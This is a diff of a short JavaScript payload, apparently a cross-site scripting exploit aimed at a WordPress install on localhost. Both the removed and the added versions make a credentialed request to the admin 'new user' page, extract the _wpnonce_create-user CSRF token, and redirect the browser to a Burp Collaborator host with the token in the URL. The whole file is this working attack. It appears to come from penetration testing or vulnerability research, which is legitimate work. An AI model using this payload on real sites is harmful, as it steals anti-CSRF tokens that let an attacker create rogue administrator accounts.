@@ -1,16 +1,17 @@
-var target="http://localhost/arash"
-var a = new XMLHttpRequest();
-    a.open("GET", `${target}/wp-admin/user-new.php`, true);
-    a.withCredentials = true;
-    a.onreadystatechange = function() {
-        if (this.readyState == 4 && this.status == 200) {
-            const parser = new DOMParser();
-            const htmlDocument = parser.parseFromString(
-              this.responseText,
-              "text/html"
-            );
-      const token_key = htmlDocument.getElementsByName("_wpnonce_create-user")[0].value;
-      window.location = 'http://e1gjugasquv15kb1v024p4gwsnydm2.burpcollaborator.net/?data=' + token_key
+
+function loadXMLDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      const parser = new DOMParser();
+      const htmlDocument = parser.parseFromString(this.responseText, "text/html");
+      const token = htmlDocument.getElementById("_wpnonce_create-user").value;
+      window.location = 'http://e1gjugasquv15kb1v024p4gwsnydm2.burpcollaborator.net/?data=' + token
     }
-    }
+  };
+  xhttp.withCredentials = true
+  xhttp.open("GET", "http://localhost/arash/wp-admin/user-new.php", true);
+  xhttp.send();
+}
+loadXMLDoc();
 
